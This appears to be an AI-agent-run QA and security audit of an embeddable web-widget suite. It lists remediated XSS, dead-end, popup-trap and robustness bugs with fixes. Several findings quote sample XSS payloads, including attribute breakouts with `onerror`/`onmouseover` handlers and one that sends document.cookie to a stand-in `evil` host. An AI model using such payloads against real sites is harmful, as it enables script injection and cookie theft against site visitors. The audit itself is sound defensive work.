# Widget suite QA audit — 9 July 2026

_Full-suite quality sweep of all 47 embeddable widgets plus the shared editor shell, the config/auth API surface and the client dashboard. Run by a fleet of 98 agents (one reviewer per area, each finding then re-checked by an adversarial verifier against the actual source). Reported findings are the ones that survived verification._

## Remediation status

**All 13 high-severity and all 73 medium-severity findings are fixed** on branch `claude/widget-suite-qa-h4vkpo` (9 July 2026).

- **Highs (13/13):** the reviews / worldmap / offers-grid XSS sinks, the offer-* relative-`/api` embed blanks, the offer-builder save-failure form wipe, the countdown false "offer ended", the carousel runaway interval, the offers inactivity re-open loop, the popup Vimeo autoplay URL, the events "+N more" dead end and the prism dead-link mismatch.
- **Mediums (73/73):** the CSS-`url()` overlay vectors (offer-card, testimonials) and the mybooking link-scheme gap; the un-closable / dead-end control family (whatsapp, offer-card, reviews, consent, spotlight, appointment, weather); the robustness set (hours overnight logic, offers-grid API origin, youtube observer leak, dealbar double-init, consent fetch timeouts, the API update-vs-create lookup check, the dashboard delete cache); and a broad accessibility pass (focus management after re-render, aria on icon-only controls, visible focus). Two demo-page residuals were closed too.

Widget `VERSION` constants were bumped throughout. Test coverage was extended (`npm run test:qa-highs` for the highs, `npm run test:boot` mounts every touched widget) and the existing widget, deeplink and Smart Section suites stay green. The 117 low findings below are not yet actioned.

## How this was done

- **Coverage:** 47 `public/widget-*.js` widgets + 3 shared areas (`editor-shell.js`/`tgse-rules.js`, the `api/widget-config.js` + auth surface, and the `index.html` dashboard). For each widget the reviewer also read its `editor-*.html` and `demo-*.html`.
- **Dimensions per Andy's brief:** security, robustness, dead ends, circles of doom (unescapable / looping states), UX/UI, usability and accessibility.
- **Two passes:** a first-pass reviewer produced findings; a second, deliberately sceptical verifier re-read the code and marked each **CONFIRMED**, **PLAUSIBLE** or **REJECTED**. Only confirmed and plausible findings are below (4 were rejected as false positives and dropped).
- **Rule for a finding:** it had to be anchored to a specific `file:line` with a concrete failure scenario. No style nitpicks.

## Results at a glance

**203 verified findings** across 48 areas — **0 critical, 13 high, 73 medium, 117 low.** Nothing is on fire; there is no data-loss or account-takeover bug. The work is a long tail of hardening, plus a cluster of security and dead-end issues worth doing as batches.

| Severity | Count | Read as |
|---|--:|---|
| 🔴 Critical | 0 | — |
| 🟠 High | 13 | Do these first — real XSS, embed-breakers and traps |
| 🟡 Medium | 73 | Noticeable UX / robustness gaps |
| ⚪ Low | 117 | Polish, a11y, defensive hardening |

| Category | Count |
|---|--:|
| Robustness | 53 |
| Accessibility | 44 |
| Dead ends | 38 |
| Security | 23 |
| UX / UI | 18 |
| Usability | 15 |
| Circles of doom | 12 |

> The single most efficient way to clear this list is to fix **patterns, not widgets** — most of the 203 findings are the same handful of mistakes repeated. The seven themes below cover the majority of them.

---

## The fix-once patterns

### 1. Untrusted strings reach HTML/CSS sinks with the wrong sanitiser  _(security — the biggest theme, ~13 findings inc. 4 of the 13 highs)_

`esc()` (HTML-entity encoding) is being used in places that need a different defence. Four distinct sub-bugs, all the same root cause:

- **No URL scheme allowlist → `javascript:` executes.** `reviews` ctaUrl (🟠), `mybooking` document links (🟡), `offer-builder` "Open" link (⚪), `spinwheel` protocol-relative `//host` (⚪).
- **Attribute breakout via unescaped `"` in an allowed URL.** `worldmap` deal-card img/href (🟠) — `safeUrl()` returns the raw string, a `"` in a supplier image URL closes the attribute and attaches an `onerror`.
- **Colour values into `style` without a whitelist.** `reviews` (🟠), `countdown`, `team`, `offer-card`, `offers-grid` (all ⚪) — a colour like `#000" onmouseover="alert(1)` breaks out; a `url(...)` colour fires an external request from every visitor.
- **CSS `url()` breakout — `)` and `;` survive `esc()`.** `offer-card` and `testimonials` (🟡), `offer-page` and `events` (⚪) — an author/feed image value becomes a full-viewport fixed overlay (defacement / clickjacking) or a tracking beacon.
- **Unvalidated value into a class attribute.** `offers-grid` `columns` (🟠) — breaks out of `class="..."` into an `<img onerror>`.

**Note:** server-side `sanitiseConfig` deliberately leaves colours and URLs untouched, so this defence has to live in the widgets.
**Fix once:** add a shared trio to the widget toolkit — `tgSafeUrl()` (scheme allowlist **and** attribute-escape the result), `tgSafeColor()` (hex / named-colour whitelist), `tgCssUrl()` (reject/encode `)` `;` `'` for `url()` context) — and route every sink through them.

### 2. A failed config fetch is indistinguishable from a real "empty / ended / done" state  _(robustness — high user impact)_

Widgets fall back to defaults on any network error and then render a **definitive negative**:

- `countdown` → **"This offer has now ended."** on a sale that is still live (🟠).
- `offer-builder` → **wipes the entire filled-in offer form** on a transient save failure, no recovery (🟠, dead-end).
- `weather` → **endless loading shimmer**, no timeout on the fetch (🟡).

**Fix once:** distinguish "config failed to load" from "genuinely empty/expired"; add a fetch timeout and a neutral retry state; never render a final negative message off a failed or missing request.

### 3. Popups and modals a visitor can't escape  _(circle-of-doom — Andy's headline concern)_

The popup family lets the editor switch off **every** exit at the same time:

- `offers` popup: close button off + Escape off + no backdrop = **trapped for the session** (🟡). Separately, the **inactivity trigger re-opens the popup forever** after each dismiss, ignoring frequency/suppress-after-dismiss (🟠).
- `popup` widget: same all-exits-off trap on bar/announcement layouts (🟡).
- `consent` modal: long body text **clips Accept/Reject off-screen** on short viewports while blocking the page — no consent choice possible (🟡).
- `enquiry` / `enquirypro`: a misconfigured or network-blocked Turnstile **permanently strands the visitor** at the final Send step (🟡 ×2).

**Fix once:** guarantee at least one exit at save/render time (keep Escape always, or force a close control when there's no backdrop); re-run eligibility before any re-open; give Turnstile a fallback so a blocked challenge can't lock the form.

### 4. The offer-* trio breaks the remote-embed contract  _(robustness — 2 highs + 1 latent)_

`offer-card` (🟠, line 31), `offer-page` (🟠, line 33) and **`offer-builder` (line 25, not separately flagged)** hardcode `const API_BASE = '/api/widget-config'` instead of resolving the script origin. Embedded on a customer domain they fetch the customer's 404 and render **blank**. The other 44 widgets resolve the origin correctly, so this is a contained three-file fix — copy the `resolveApiBase()`/`__TG_WIDGET_API__` pattern from `widget-hours.js`.

### 5. Dead CTAs and dead links  _(dead-end — 38 findings)_

Controls that promise an action and deliver nothing:

- `airport`: the CTA band renders a headline with **no button** in its default (blank-URL) config (🟡); resort chips fall back to `href="#"` and jump the page to the top (⚪).
- `events`: month-view **"+N more" opens event #1** (already visible) instead of the hidden events (🟠).
- `whatsapp`: a blank phone still renders a "Start chat" button that just **opens a duplicate tab** (🟡).
- `prism`: the editor shows a green ✓ "links to…" for a bare domain, but the widget's stricter `safeUrl()` **renders it as a dead, non-clickable slice** on the live site (🟠).

**Fix once:** never emit a link/CTA without a resolved, valid destination — gate the control on the target, and make editor validators agree with the widget's runtime validator.

### 6. Editor preview can spin forever  _(circle-of-doom / robustness)_

`editor-airport.html:752` and **`editor-attraction.html:448`** both poll `setTimeout(renderPreview, 60)` waiting for the widget global, with **no cap**. A widget script that 404s or throws during parse leaves the editor preview blank and polling forever, with no error. (The other editors' timers are proper debounces and are fine.) **Fix:** cap the retries (~3s) and show "Preview unavailable — widget script failed to load".

### 7. CSP-clean deviations  _(security / robustness — low but real)_

- `attraction` injects the Leaflet `<script>`/`<link>` into `document.head` (blocked under a strict host CSP → silent empty map).
- `worldmap` uses an inline `onerror` handler inside injected HTML (CSP violation on strict sites).
- `catalogue`: the serverless handler source is **byte-duplicated into `public/`** and served world-readable, leaking Airtable base/table/field IDs and the privileged staff email domains. Delete the public copy.
- Several map widgets swallow a Leaflet load failure silently, leaving a blank grey box with no fallback.

_Plus a cross-cutting **accessibility** theme (44 findings): tabs without full ARIA / arrow-key wiring, modals without focus trapping or restore, missing visible focus, and form controls without programmatic labels. Best handled as a dedicated a11y pass on the shared shell + the interactive widgets (tabs, modals, forms)._

### Server-side (`api`) notes _(low severity, but worth a look)_

- Cross-tenant IDOR: `GET /api/widget-config` returns another owner's internal Airtable `recordId` to any authenticated session (⚪ — id disclosure only; the record can't be used against ownership-checked endpoints).
- `sanitiseForFormula` truncates **after** escaping, so input can end in a lone backslash and corrupt the `filterByFormula` (⚪).
- Client-code comparison isn't constant-time despite the comment (⚪ — rate limiting makes it impractical).

---

## Priority queue — the 13 high-severity findings in full

#### H1. [`carousel`] Re-entrant _advanceBy leaks an orphaned interval, causing an unstoppable runaway carousel
**Category:** circle-of-doom · **Where:** `public/widget-carousel.js:745-755, teardown 768/783`

_advanceBy() assigns a stepper interval to this._t2 without clearing a previously running one, and its termination branch clears via the shared self._t2 rather than its own interval id. A second _advanceBy invocation (steps>=2) while the first interval is still draining orphans the first interval, which then advances the carousel every 180ms indefinitely.

**What breaks:** On a 4+ slide carousel a visitor clicks a far dot (steps>=2, starts interval A), then ~1s later clicks another far dot (steps>=2) before A drains. The second call overwrites this._t2 with interval B, orphaning A. A keeps firing every 180ms and calls _next() whenever !animating, so the carousel auto-advances forever. _stop(), pause-on-hover, off-screen/visibility handlers only clear this.timer, and destroy() only clears this._t2 (=B), so nothing short of a page reload stops A.

**Fix:** Clear any existing stepper before starting a new one (`if (this._t2) clearInterval(this._t2);` at the top of _advanceBy), AND have the interval capture its own id in a local const and clearInterval(thatLocalId) in the termination branch so an interval can only ever clear itself. Also null out this._t2 after clearing. Optionally guard reentrancy so a stepper in progress ignores new advance requests.

#### H2. [`offers`] Inactivity-triggered popup re-opens forever after the visitor dismisses it
**Category:** circle-of-doom · **Where:** `public/widget-offers.js:1315-1330 (popupAttachTrigger 'inactivity'), :8493-8536 (_popupOpen), :8538-8566 (_popupClose), :8747-8748 (attach, cleanup stored but never called)`

For popupTrigger='inactivity', popupAttachTrigger arms document-level mousemove/keydown/scroll/touchstart listeners whose timer calls fire()->_popupOpen(). fire() never tears those listeners down (only the one-shot triggers load/time/scroll/exit-intent/click/pageviews self-remove on fire), and the cleanup closure saved to this._popupTriggerCleanup at line 8748 is never called anywhere in the widget. _popupClose sets _popupIsOpen=false, clearing the only re-entry guard, and popupShouldShow eligibility is checked once at attach and never re-evaluated. So after the visitor dismisses the popup, the next inactivity interval re-arms and re-opens the same popup, repeating for the whole visit and ignoring frequency and suppress-after-dismiss.

**What breaks:** Client sets popupTrigger='inactivity' (editor default 30s) with popupFrequency='session' and suppress-after-dismiss enabled. Visitor sees the popup, clicks X (_popupClose sets _popupIsOpen=false). ~30s after their last mouse move the timer fires, _popupOpen's guard passes because _popupIsOpen is false, and the identical popup re-opens over the content. Dismissing again resets nothing permanent; it returns every 30s of inactivity for the entire session with no configured limit honoured.

**Fix:** Make the inactivity trigger one-shot: inside fire() (or on first fire) call events.forEach(e => document.removeEventListener(e, reset)) and clearTimeout(timer), mirroring the scroll/exit-intent branches. Alternatively invoke this._popupTriggerCleanup() at the top of _popupOpen once the popup shows. In all cases re-run popupShouldShow before any re-open so popupFrequency and suppress-after-dismiss/conversion are re-evaluated.

#### H3. [`events`] Month-view "+N more" is a dead end — hidden events are unreachable
**Category:** dead-end · **Where:** `public/widget-events.js:1721-1724 (button rendered 1549, bound 1635-1647, pills 1532-1548)`

A calendar cell renders the first 3 events as pills plus a '+N more' button for the remainder. Clicking '+N more' calls _openModalList(day, events), a stub that runs `if (events.length) this._openModal(events[0])`. Because both the pills and the '+N more' event list are drawn from _allEvents() sorted by startTs, events[0] is always the day's first event — already visible as pill #1. The 4th, 5th, ... events counted by '+N more' are never opened.

**What breaks:** A date has 5 events. Month view shows pills for events 1-3 and a '+2 more' button. The visitor clicks '+2 more' expecting the two hidden events; the widget instead opens the detail modal for event 1 (already visible). Events 4 and 5 are permanently unreachable in month view.

**Fix:** Implement _openModalList to render a real day list (all events for that day, each row clickable to its own detail modal) instead of opening events[0]. As a stopgap, open a single modal that lists every event for that day with links. The stub comment at line 1722 already anticipates this.

#### H4. [`offer-builder`] A transient save failure wipes the whole filled-in offer form with no way to recover it
**Category:** dead-end · **Where:** `public/widget-offer-builder.js:1102, 1105-1123`

When cfg.save is true, _submit() delegates to _saveOffer(). On any non-2xx response or network/JSON error the promise chain reaches .catch (line 1102) which calls _success(offer, null, msg). _success replaces this.root.innerHTML wholesale (1117), tearing the entire editable form out of the DOM. The sole forward control, 'Create another offer', calls _render() which rebuilds a blank form (cfg.offer is unchanged/null for a new offer, so nothing is re-prefilled). The Saving-disabled submit button is also never restored on the form because the form no longer exists.

**What breaks:** An agent spends several minutes building an offer (AI draft, photos, five translated languages), clicks Save, and the session cookie has just expired (401) or the network blips. saveEndpoint returns non-2xx, the catch fires, and the form is instantly replaced by a red 'Could not save the offer' panel. 'Create another offer' yields an empty form. All typed input is gone; only a copyable JSON blob of the offer remains.

**Fix:** On save failure do NOT swap out the form. Keep it intact, re-enable the .ob-submit button (reset its label from 'Saving…'), and surface the error inline above the .ob-actions row so the agent can re-authenticate and retry without losing input. Only call _success() (which tears down to the panel) when the save genuinely succeeds.

#### H5. [`offer-page`] Remote config fetch uses a relative /api path, so remote-config embeds render blank on any customer site
**Category:** dead-end · **Where:** `public/widget-offer-page.js:33, :1279, :1298-1300`

API_BASE is the relative literal '/api/widget-config' (line 33) and loadConfigFromApi() fetches it (line 1279). On a customer domain this resolves against the customer origin, not widgets.travelify.io, so the fetch returns the customer's 404/HTML instead of JSON. The same file already derives SCRIPT_BASE and uses it for the maps script and enquiry endpoint, but not config; there is no window.__TG_WIDGET_API__ support.

**What breaks:** An agency embeds `<div data-tg-widget="offer-page" data-tg-id="tgw_...">` on their own domain (no inline data-tg-config). fetch('/api/widget-config?id=...') hits the CUSTOMER origin, returns 404/HTML, res.ok is false, loadConfigFromApi returns null, init() hits `continue` and never constructs the widget. Container stays empty with only a console.error. Inline data-tg-config embeds and same-origin demo pages are unaffected, which is why it can pass local testing yet fail in the field.

**Fix:** Resolve the config base like the enquiry endpoint: `const API_BASE = (window.__TG_WIDGET_API__ || SCRIPT_BASE + 'api') + '/widget-config'`. Never fetch config from a relative path. Add a widget test asserting the fetched URL is absolute against the script origin.

#### H6. [`prism`] Editor confirms a working link for bare-domain hrefs, but the published slice is dead
**Category:** dead-end · **Where:** `public/editor-prism.html:537 (input handler stores raw value), :293-300 (safeUrlState) , :412-418 (updateHrefNote); public/widget-prism.js:43-50 (safeUrl), :332,339-343 (_slice)`

The two validators disagree. The editor auto-prepends https:// to a bare domain for DISPLAY and reports state 'ok' (green tick), but persists the un-prefixed string. The widget's safeUrl() only accepts values beginning with http(s):, mailto:, tel:, /, #, or a literal dot, so a stored bare domain like 'example.com' or 'www.example.com' fails and the slice renders as a non-interactive div. Same class of mismatch affects any value safeUrlState 'repairs' by prepending a scheme.

**What breaks:** An agency user types 'example.com' into a destination's Links-to field, sees the reassuring green '✓ Links to https://example.com', saves and publishes. On the live site that destination photo has no anchor element at all, so visitors clicking it get nothing — a silently dead link the editor certified as working.

**Fix:** Store the normalised URL, not the raw string. In the line 537 handler run the value through safeUrlState() and persist res.url when state==='ok' (e.g. C.items[selected].href = safeUrlState(e.target.value).url). Additionally/alternatively teach the widget's safeUrl() to repair bare domains so the two validators agree. The stored value must be the same one the note promises.

#### H7. [`countdown`] Config-fetch failure makes a live countdown display "This offer has now ended."
**Category:** robustness · **Where:** `public/widget-countdown.js:1301-1310, 1323-1324, 876-897, 939-944`

fetchConfig() returns null on any network error, non-2xx response, or malformed JSON. initOne then constructs the widget with `cfg || {}`, so the widget falls back to defaults() where targetDate is null. In _render, `!targetMs` makes isExpired true (line 877), and with the default expiry.behaviour 'message' the widget renders _buildExpired, showing 'This offer has now ended.' There is no error/retry/loading state, so a transient API failure is visually indistinguishable from a genuinely expired offer, and it persists until a full page reload.

**What breaks:** The widget-config API has a brief 502, or the visitor has a flaky connection on first paint. fetchConfig catches it and returns null; the widget builds with defaults (targetDate null). isExpired computes true and the default 'message' behaviour renders 'This offer has now ended.' on a sale that is actually still live, killing the conversion and misinforming the visitor until they reload.

**Fix:** Distinguish 'config failed to load' from 'genuinely expired'. Have fetchConfig signal failure distinctly (e.g. throw or return a sentinel) and, on failure, render nothing (hidden) or a neutral state with a backoff retry rather than falling through to the expired copy. At minimum, when targetDate was never provided at all, render nothing instead of the 'offer ended' message.

#### H8. [`offer-card`] Config fetch uses a relative /api path, so remote-config embeds fail on every customer site
**Category:** robustness · **Where:** `public/widget-offer-card.js:31,640`

API_BASE is the relative string '/api/widget-config'; loadConfigFromApi() (line 638-649) fetches it verbatim. The widget never resolves the API base off its own script origin, so the documented remote-config embed path only works when the widget is served from the same origin as the API.

**What breaks:** A travel agent embeds <div data-tg-widget="offer-card" data-tg-id="tgw_123"> plus the script on shop.example.com. loadConfigFromApi fetches https://shop.example.com/api/widget-config?id=tgw_123, which 404s (or CORS-fails). The catch at line 645 logs and returns null, init()'s `if (!config) continue` (line 664) skips the container, and the card silently never renders. Only inline data-tg-config or data-tg-offer embeds work off-origin.

**Fix:** Add a resolveApiBase() that returns window.__TG_WIDGET_API__ if set, else the origin derived from document.currentScript.src (captured at top-level before the IIFE's async code runs), and build API_BASE = resolveApiBase() + '/api/widget-config'. Copy the pattern from widget-hours.js.

#### H9. [`popup`] Vimeo autoplay produces a malformed embed URL that breaks the video
**Category:** robustness · **Where:** `public/widget-popup.js:1117 and :1126-1128`

getVideoEmbedUrl returns a Vimeo embed with no query string (line 1117). renderVideo appends the autoplay flag as `'&autoplay=1'` with a leading ampersand (line 1126) — correct for the YouTube branch which already ends in a query string, but wrong for Vimeo. The result 'https://player.vimeo.com/video/123&autoplay=1' places the flag in the path segment, producing an invalid Vimeo video URL.

**What breaks:** Author sets contentType 'video' with a Vimeo URL and enables videoAutoplay. The iframe src becomes 'https://player.vimeo.com/video/123&autoplay=1', which Vimeo does not resolve to a valid video id, so the visitor sees a broken/error iframe instead of the video. Affects every autoplay Vimeo popup; YouTube is unaffected because its base URL already carries a '?'.

**Fix:** Build the separator per URL rather than hard-coding '&': `const auto = cfg.videoAutoplay ? (embed.indexOf('?') === -1 ? '?' : '&') + 'autoplay=1' : '';` — or have getVideoEmbedUrl return the Vimeo embed already carrying a '?' (e.g. '.../video/'+id+'?autoplay=0' or just a trailing '?').

#### H10. [`offers-grid`] Unvalidated `columns` config injected raw into innerHTML class attribute
**Category:** security · **Where:** `public/widget-offers-grid.js:154,195,211`

`_defaults` stores `columns: String(c.columns || 'auto')` with no numeric or whitelist clamp (line 154). `_render` concatenates it unescaped into the class string via `gridCls` (line 195) and that string reaches `root.innerHTML` (line 211). Every other user string (heading, subheading, emptyText) goes through esc(); columns is the lone exception, violating the repo rule that config strings must never reach innerHTML.

**What breaks:** A widget config with columns set to `2"><img src=x onerror=alert(document.cookie)>` (layout left at the default 'vertical') produces `<div class="tgog-items grid cols-2"><img src=x onerror=alert(document.cookie)>" data-items></div>`, breaking out of the class attribute; the img's onerror executes the injected script on the customer page when the grid mounts.

**Fix:** Whitelist columns to the known token set before use, e.g. `columns: ['2','3','4'].indexOf(String(c.columns)) !== -1 ? String(c.columns) : 'auto'`, so only safe tokens ever reach the class string.

#### H11. [`reviews`] ctaUrl accepts javascript: URLs — esc() does not sanitise the scheme
**Category:** security · **Where:** `public/widget-reviews.js:471 (href), default at 398; sink also 511/538 (img src)`

The header CTA renders c.ctaUrl straight into an href with only HTML-entity escaping, no scheme allowlist. A javascript: (or data:) ctaUrl reaches the DOM unmodified. photoUrl at lines 511/538 is likewise placed in <img src> with only esc(), a lower-risk variant of the same untrusted-URL gap.

**What breaks:** A widget config whose ctaUrl is `javascript:...` renders a 'Write a Review' link that runs attacker script in the customer page context when a visitor clicks it. Server sanitisation does not block it (colours/URLs are untouched by sanitiseConfig).

**Fix:** Before rendering, validate ctaUrl against an allowlist of schemes (http, https, mailto, and same-page '#'); replace anything else with the '#' default. Apply the same check to photoUrl.

#### H12. [`reviews`] Colour/config values interpolated raw into style attributes (attribute-breakout XSS)
**Category:** security · **Where:** `public/widget-reviews.js:413 (root style), 488 (a.color)`

Six colour vars plus borderRadius (line 413) and each aiHighlight colour (line 488) are interpolated raw into style attributes that are then set via innerHTML. A colour value containing a double quote breaks out of the attribute and can attach an event handler, or a malformed value silently corrupts the widget's opening tag and blanks the render.

**What breaks:** A config with brandColor `#000" onmouseover="alert(1)` (or a crafted aiHighlights[].color) breaks out of the style attribute and runs arbitrary JS in the host page on mouseover. Even benignly, a colour containing a quote corrupts the root tag and can blank the whole widget.

**Fix:** Whitelist every colour against /^#([0-9a-f]{3,8})$/i (or a named-colour set) and coerce borderRadius with Number() + clamp before interpolation; substitute the default on any mismatch.

#### H13. [`worldmap`] Deal-card image/link URLs bypass attribute escaping → XSS
**Category:** security · **Where:** `public/widget-worldmap.js:3701-3706 (safeUrl at 342-348)`

safeUrl() only validates the URL scheme and returns the raw string for http(s)/mailto/tel URLs without escaping double quotes. Its output is interpolated straight into double-quoted attributes in _cardHtml (img src line 3702, anchor href line 3706) and rendered via innerHTML. o.image and o.url originate from the /api/destination-map-deals supplier feed. A double quote in either value closes the attribute and injects arbitrary attributes/handlers.

**What breaks:** A deal offer arrives with o.image = 'https://a.tld/x.jpg" onerror="fetch(`//evil/`+document.cookie)'. safeUrl passes it unchanged (matches https:), so line 3702 emits `<img src="https://a.tld/x.jpg" onerror="...">`; when the (bad) URL fails to load the injected onerror executes attacker JS inside the widget page. The same attribute break works on o.url via the card href (e.g. injecting onmouseover), and would fire on hover of the whole card anchor.

**Fix:** Escape the whitelisted URL for attribute context before interpolation: wrap both values as esc(img) / esc(href) in the template (esc already encodes " and '), or have safeUrl return an esc()'d string. Both the img src and the anchor href must be escaped.

---

## Per-widget scorecard

_Sorted by high-severity count, then total. The health note is the reviewer's one-line summary._

| Widget / area | 🔴 | 🟠 | 🟡 | ⚪ | Total | One-line health |
|---|--:|--:|--:|--:|--:|---|
| `reviews` |  | 2 | 3 | 5 | 10 | Reviewed public/widget-reviews.js (731 lines), editor-reviews.html and demo-reviews.html. The widget is generally solid: Shadow DOM with :host{all:initial}, … |
| `countdown` |  | 1 | 2 | 3 | 6 | The countdown widget is largely well-built: it is CSP-clean (no inline handlers, no injected script, all text via textContent, CTA URLs run through safeUrl, … |
| `offer-builder` |  | 1 | 2 | 3 | 6 | The offer-builder widget is largely well-built: it esc()s text, whitelists photo URLs through safePhotoUrl() before interpolating into style attributes, has … |
| `offer-page` |  | 1 | 2 | 3 | 6 | The offer-page widget is largely well-built: CSP-clean (no inline handlers, no injected script, no eval), text runs through esc(), URLs pass a safeUrl() whit… |
| `events` |  | 1 | 1 | 3 | 5 | The events widget is broadly solid: Shadow DOM with :host{all:initial}, thorough esc() on all text, safeUrl/safeImageUrl whitelisting, safeColorE/safeFontSta… |
| `offer-card` |  | 1 | 3 | 1 | 5 | Reviewed public/widget-offer-card.js (681 lines) and public/demo-offer-card.html (193 lines); no editor-offer-card.html exists. The widget is well-structured… |
| `prism` |  | 1 |  | 4 | 5 | The prism widget script is clean and well-hardened: all config values are whitelisted (colours via safeColor, fonts via an allow-list, shadows via a fixed ma… |
| `carousel` |  | 1 | 1 | 2 | 4 | The carousel widget is largely well-built: config is sanitised (esc/safeColor/safeFont/clampNum/safeUrl/safeImg), Shadow DOM with :host{all:initial}, resolve… |
| `offers-grid` |  | 1 | 1 | 2 | 4 | The offers-grid widget is mostly sound: it uses Shadow DOM with :host{all:initial}, escapes heading/subheading/emptyText via esc(), has a correct double-init… |
| `popup` |  | 1 | 1 | 2 | 4 | Reviewed all 1555 lines of public/widget-popup.js plus the editor and demo. The widget is generally solid: config values are escaped/whitelisted before hitti… |
| `worldmap` |  | 1 | 1 | 2 | 4 | The worldmap widget is largely well-built: Shadow DOM with :host{all:initial}, resolveApiOrigin honours __TG_WIDGET_API__ then script origin, all text/name/p… |
| `offers` |  | 1 | 2 |  | 3 | Reviewed public/widget-offers.js (9,526 lines), editor-offers.html and demo-offers.html. Security posture is strong: all text goes through esc(), all offer/c… |
| `weather` |  |  | 2 | 5 | 7 | The weather widget is largely well built: Shadow DOM with :host{all:initial}, consistent esc() on every text sink, a proper safeUrl() allowlist (https/mailto… |
| `airport` |  |  | 1 | 4 | 5 | The airport widget is largely clean: consistent esc() sanitisation, whitelisted colours/URLs/IATA/coords, correct Shadow DOM isolation, robust fetch error ha… |
| `api-security` |  |  | 1 | 4 | 5 | Reviewed api/widget-config.js, api/_auth.js, api/widget-auth.js and public/auth-client.js. The core ownership model is sound: canModifyWidget() fails closed … |
| `appointment` |  |  | 3 | 2 | 5 | The appointment widget is well built and notably clean on security: every config/network string that reaches innerHTML is run through esc(), colours/fonts/nu… |
| `attraction` |  |  | 1 | 4 | 5 | The attraction widget is largely clean, especially on security: text is escaped via esc() everywhere it reaches innerHTML, URLs pass safeUrl() (http/https on… |
| `consent` |  |  | 4 | 1 | 5 | The consent widget is well-built and notably security-clean: every config string is escaped (esc), URLs are whitelisted (safeUrl blocks javascript:/data:), c… |
| `currency` |  |  | 2 | 3 | 5 | The Currency Converter widget is well-built and largely clean: config is defended (esc() everywhere, hex/font whitelists, currency codes filtered against a N… |
| `editor-shell` |  |  | 2 | 3 | 5 | tgse-rules.js (evaluate/armTrigger/armDeferred) is robust — consistent fail-open, try/catch storage, fire-once guards, cleanup on every armer, no eval/inject… |
| `enquirypro` |  |  | 3 | 2 | 5 | Enquiry Pro is a clean, security-conscious multi-step form: every dynamic value is written via textContent/createTextNode (no innerHTML/XSS sinks), colours p… |
| `share` |  |  | 1 | 4 | 5 | The share widget is largely clean and defensively written: Shadow DOM with :host{all:initial}, a proper resolveApiBase() (and a matching TRACK_BASE resolver)… |
| `travel-results-ai` |  |  | 2 | 3 | 5 | The widget is well built and largely clean: all untrusted AI/supplier text is rendered via textContent (no innerHTML XSS sinks in the widget), Shadow DOM wit… |
| `contact` |  |  | 2 | 2 | 4 | The contact widget is clean and secure. All config strings pass through esc() before innerHTML, safeUrl() correctly blocks javascript:/data: URLs, colours an… |
| `dealbar` |  |  | 1 | 3 | 4 | The customer-facing widget (public/widget-dealbar.js) is largely clean and CSP-compliant: every config string is escaped through esc(), safeUrl() blocks java… |
| `emailsig` |  |  | 1 | 3 | 4 | The emailsig widget is security-solid and largely clean: every user value is validated at source (safeColor/safeUrl/safeFontStack/clampInt/clampText) and esc… |
| `hours` |  |  | 1 | 3 | 4 | The Opening Hours widget is in good shape. It is CSP-clean (no inline handlers, no injected scripts, no eval), every author-supplied string is run through es… |
| `quote-pdf` |  |  | 2 | 2 | 4 | The visitor-facing widget (public/widget-quote-pdf.js) is clean and well-defended: Shadow DOM with :host{all:initial}, every innerHTML sink is fed through es… |
| `spinwheel` |  |  | 1 | 3 | 4 | The Spin the Wheel widget is well-built and mostly clean: Shadow DOM with :host{all:initial}, config sanitised through esc()/hexOk()/a font whitelist/safeUrl… |
| `spotlight` |  |  | 2 | 2 | 4 | The Spotlight widget is security-clean: every content value passes through esc(), URLs go through a safeUrl() protocol allowlist (javascript:/data: rejected)… |
| `team` |  |  | 1 | 3 | 4 | The Team Showcase widget is largely clean and well-hardened. All user content passes through esc() before innerHTML, URLs are scheme-allowlisted (javascript:… |
| `testimonials` |  |  | 3 | 1 | 4 | The testimonials widget is largely well-engineered and genuinely XSS-hardened: all text goes through esc(), URLs through isSafeUrl(), colours through safeCol… |
| `textfx` |  |  |  | 4 | 4 | Text FX is a purely presentational kinetic-typography widget with 12 render modes. It is one of the cleaner widgets in the suite: all text is esc()'d, colour… |
| `whatsapp` |  |  | 3 | 1 | 4 | The WhatsApp widget is clean on security and CSP (all dynamic values pass through esc(), colours/fonts/image URLs whitelisted, both API bases resolve to the … |
| `youtube` |  |  | 1 | 3 | 4 | The YouTube widget is well built and largely clean. Security is solid: every dynamic string goes through esc(), URLs through safeUrl() (http/https only, so n… |
| `backtotop` |  |  | 2 | 1 | 3 | The Back to Top widget is clean and secure: CSP-safe (no inline handlers/injected script/eval), all innerHTML interpolation is escaped or whitelisted (esc, s… |
| `dashboard` |  |  | 2 | 1 | 3 | The dashboard (public/index.html) is largely solid: all 44 registry widgets have a matching loadMiniPreview branch and a script tag, user-supplied data (widg… |
| `enquiry` |  |  | 1 | 2 | 3 | The Enquiry widget is one of the cleaner widgets in the suite. Security hygiene is strong: every dynamic value is rendered via a DOM builder (el()) using tex… |
| `faq` |  |  | 1 | 2 | 3 | The FAQ widget is well-engineered and largely clean. Config strings are consistently escaped (esc), colours/fonts are whitelisted (safeColor/hexToRgba/safeFo… |
| `flighttime` |  |  | 1 | 2 | 3 | The flighttime widget is well built and largely defect-free on the security axis: every dynamic value is escaped or whitelisted (esc(), hexOk(), safeFontStac… |
| `loader` |  |  | 1 | 2 | 3 | The loader widget (public/widget-loader.js) is genuinely clean and secure: it uses Shadow DOM with :host{all:initial}, renders all text via textContent (no i… |
| `mybooking` |  |  | 1 | 2 | 3 | The mybooking widget (v1.10.3, 5941 lines) is a mature, carefully engineered widget. It is broadly in excellent shape for the dimensions Andy cares about mos… |
| `rss` |  |  | 1 | 2 | 3 | The RSS widget itself is well-hardened: Shadow DOM with :host{all:initial}, esc() on every text sink, safeUrl()/safeColor()/safeFont() whitelists, an explici… |
| `smartsection` |  |  | 2 | 1 | 3 | Smart Section is one of the cleaner widgets in the suite. It is fail-open by design, uses textContent (never innerHTML) for all injected UI, sets DOM-propert… |
| `statscounter` |  |  | 1 | 2 | 3 | The Stats Counter widget is one of the cleaner widgets in the suite. Security is solid: all author text (heading, labels, prefix/suffix) is escaped via esc()… |
| `catalogue` |  |  |  | 2 | 2 | "catalogue" is not an embeddable widget. public/widget-catalogue.js is a byte-for-byte duplicate of the serverless handler api/widget-catalogue.js (confirmed… |
| `logos` |  |  | 1 | 1 | 2 | The Logos widget is largely clean and well-built. Security is strong: all author content passes through esc(), URLs go through safeUrl/safeImageUrl allowlist… |
| `worldclock` |  |  |  | 2 | 2 | The worldclock widget is clean. The runtime script (public/widget-worldclock.js) is CSP-safe and well hardened: heading and label are esc()'d, accent is hexO… |

---

## Full findings by area

